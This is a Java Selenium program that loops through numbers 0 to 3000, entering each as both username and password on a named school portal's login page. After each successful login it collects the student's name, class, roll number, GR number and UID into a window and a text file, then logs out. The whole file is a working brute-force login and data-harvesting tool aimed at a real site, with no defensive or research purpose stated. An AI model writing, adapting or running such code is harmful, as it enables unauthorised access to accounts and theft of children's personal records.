import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;

import javax.swing.*;
import java.awt.*;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;

public class JNScraper {
    private static final Logger logger = Logger.getLogger(JNScraper.class.getName());

    public static void main(String[] args) {
        // Set the system properties for ChromeDriver
        System.setProperty("webdriver.chrome.bin", "your path");
        System.setProperty("webdriver.chrome.driver", "your path");

        // Create a JFrame for displaying extracted data
        JFrame frame = new JFrame("Extracted Data");
        frame.setLayout(new BorderLayout());
        frame.setSize(400, 300); // Set the size of the frame
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        // Create a new ChromeDriver instance
        WebDriver driver = new ChromeDriver();

        try {
            // Make the frame visible
            frame.setVisible(true);

            // Iterate over the range of input values
            for (int inp = 0; inp <= 3000; inp++) {
                try {
                    logger.log(Level.INFO, "Navigating to the page...");
                    driver.get("http://jns.edusprint.in/jns/Security");

                    // Locate web elements on the page
                    WebElement textField = driver.findElement(By.name("SiteUserName"));
                    WebElement passwordField = driver.findElement(By.name("SitePassword"));
                    WebElement loginButton = driver.findElement(By.xpath("//*[@id='frmMCampusLogin']/div[5]/button"));

                    logger.log(Level.INFO, "Filling in the form...");
                    textField.sendKeys("" + inp);
                    passwordField.sendKeys("" + inp);

                    logger.log(Level.INFO, "Clicking the login button...");
                    loginButton.click();

                    // Check if the page reloaded successfully
                    if (!isElementPresent(driver, By.cssSelector(".profile-username"))) {
                        logger.log(Level.WARNING, "Page did not reload, skipping iteration.");
                        continue;
                    }

                    // Extract data from the page
                    WebElement profileNameElement = driver.findElement(By.cssSelector(".profile-username"));
                    WebElement classDivElement = driver.findElement(By.xpath("//li[contains(., 'Class - Div')]"));
                    WebElement rollNoElement = driver.findElement(By.xpath("//li[contains(., 'Roll No')]"));
                    WebElement grNoElement = driver.findElement(By.xpath("//li[contains(., 'GR No')]"));
                    WebElement uidElement = driver.findElement(By.xpath("//li[contains(., 'UID')]"));

                    // Get text values from web elements
                    String profileName = profileNameElement.getText();
                    String classDiv = classDivElement.getText();
                    String rollNo = rollNoElement.getText();
                    String grNo = grNoElement.getText();
                    String uid = uidElement.getText();

                    // Display data in the GUI frame
                    displayInGUI(frame, profileName, classDiv, rollNo, grNo, uid);

                    // Write extracted data to a file
                    writeToFile("your path output.txt", profileName, classDiv, rollNo, grNo, uid);

                    // Logout and wait
                    logout(driver);
                    Thread.sleep(2000);
                } catch (Exception e) {
                    handleException(e);
                }
            }
        } finally {
            // Close the browser and WebDriver instance
            logger.log(Level.INFO, "Closing the browser...");
            driver.quit();
        }
    }

    // Handle exceptions, retry if connection times out
    private static void handleException(Exception e) {
        if (e.getMessage().contains("ERR_CONNECTION_TIMED_OUT")) {
            logger.log(Level.SEVERE, "Connection timed out. Retrying...");
        } else {
            e.printStackTrace();
        }
    }

    // Display extracted data in the GUI frame
    private static void displayInGUI(JFrame frame, String profileName, String classDiv, String rollNo, String grNo, String uid) {
        JPanel panel = new JPanel();
        panel.setLayout(new BoxLayout(panel, BoxLayout.Y_AXIS));

        JLabel nameLabel = new JLabel("Profile Name: " + profileName);
        JLabel classLabel = new JLabel("Class - Div: " + classDiv);
        JLabel rollNoLabel = new JLabel("Roll No: " + rollNo);
        JLabel grNoLabel = new JLabel("GR No: " + grNo);
        JLabel uidLabel = new JLabel("UID: " + uid);

        panel.add(nameLabel);
        panel.add(classLabel);
        panel.add(rollNoLabel);
        panel.add(grNoLabel);
        panel.add(uidLabel);

        frame.getContentPane().removeAll();
        frame.getContentPane().add(panel);
        frame.revalidate();
        frame.repaint();
    }

    // Check if an element is present on the page
    private static boolean isElementPresent(WebDriver driver, By by) {
        try {
            driver.findElement(by);
            return true;
        } catch (org.openqa.selenium.NoSuchElementException e) {
            return false;
        }
    }

    // Write data to a file
    private static void writeToFile(String fileName, String... data) {
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(fileName, true))) {
            for (String line : data) {
                writer.write(line);
                writer.newLine();
            }
            writer.newLine();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    // Logout from the application
    private static void logout(WebDriver driver) {
        driver.get("http://jns.edusprint.in/jns/Security/Login/SignOut?QHash=mmHDB7Gsu3rnctIHIrEE2w==");
    }
}
